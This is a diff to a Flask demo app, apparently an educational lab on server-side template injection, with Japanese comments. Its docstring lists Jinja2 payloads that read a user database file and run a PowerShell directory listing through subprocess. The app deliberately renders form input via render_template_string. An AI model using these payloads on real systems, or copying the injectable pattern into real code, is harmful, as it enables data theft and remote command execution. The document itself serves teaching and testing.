@@ -8,7 +8,7 @@ Server-Side Template Injection (SSTI)
 {{ ''.__class__.__base__.__subclasses__()[92].__subclasses__()[0].__subclasses__()[0]('db/users.db', 'rb').read() }}
 
 サーバーのルートディレクトリーのファイルの一覧を表示させるペイロード：
-{{ request.application.__globals__.__builtins__.__import__('subprocess').check_output('dir', stderr=request.application.__globals__.__builtins__.__import__('subprocess').STDOUT, shell=True).decode() }}
+{{ request.application.__globals__.__builtins__.__import__('subprocess').check_output('powershell ls ..', shell=True).decode() }}
 """
 
 from flask import Flask, render_template_string, request
@@ -20,7 +20,7 @@ def index_get():
   extra_html = ''
   if request.method == 'POST' and request.form.get('name') is not None:
     name = request.form.get('name')
-    extra_html = f'<p>Welcome, {name}</p>'
+    extra_html = f'<pre>Welcome, {name}</pre>'
 
   # フォーマット文字列でHTMLコンテンツを動的に生成することで、SSTI攻撃は可能となる
   html = f"""
@@ -28,7 +28,7 @@ def index_get():
     <head>
       <title>Index</title>
       <style>
-      p {{ overflow-wrap: break-word; white-space: pre-wrap; }}
+      pre {{ overflow-wrap: break-word; white-space: pre-wrap; }}
       </style>
     </head>
     <body>
